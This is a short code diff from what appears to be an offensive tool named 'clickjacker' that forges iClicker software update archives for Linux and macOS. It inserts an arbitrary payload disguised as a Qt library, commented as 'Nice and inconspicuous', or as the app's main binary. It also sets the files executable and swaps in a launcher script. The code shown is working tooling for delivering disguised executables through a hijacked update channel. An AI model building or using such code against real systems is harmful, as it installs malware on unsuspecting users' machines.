@@ -30,7 +30,7 @@ MACOS_REMOTE_PATH = "/ic7files/iclicker/QA/update-iclicker-{}-mac.tar.gz"
 
 PATH_REGEX = re.compile(r"^/ic7files/iclicker/QA/iclicker-QA-\d+\.xml(\?.*)?$")
 
-DATA_DIR = "temp" # TODO: change
+DATA_DIR = "clickjacker-temp"
 DATA_PATH = "/ic7files/iclicker/QA/"
 
 WINDOWS_UPDATE_NAME = "update-iclicker-win.zip"
@@ -263,11 +263,17 @@ def gen_linux_archive(payload, host, version):
         temp.seek(0, os.SEEK_SET)
 
         with tarfile.open(fileobj=temp, mode='a') as tar:
-            pinfo = tarfile.TarInfo("Libs/libQt5Hal.so.5") # Nice and inconspicuous
+            pinfo = tarfile.TarInfo("./Libs/libQt5Hal.so.5") # Nice and inconspicuous
             pinfo.size = plen
             pinfo.mode = 0o755
             tar.addfile(pinfo, payload)
-            tar.add("launcher-linux.sh", arcname="iclicker.sh")
+
+            def make_executable(info):
+                info.mode = 0o755
+                return info
+
+            tar.add("launcher-linux.sh", arcname="./iclicker.sh",
+                    filter=make_executable)
 
         temp.seek(0, os.SEEK_SET)
 
@@ -293,7 +299,7 @@ def gen_macos_archive(payload, host, version):
         temp.seek(0, os.SEEK_SET)
 
         with tarfile.open(fileobj=temp, mode='w|gz') as tar:
-            pinfo = tarfile.TarInfo("iclicker.app/Contents/MacOS/iclicker")
+            pinfo = tarfile.TarInfo("./iclicker.app/Contents/MacOS/iclicker")
             pinfo.size = plen
             pinfo.mode = 0o755
             tar.addfile(pinfo, payload)
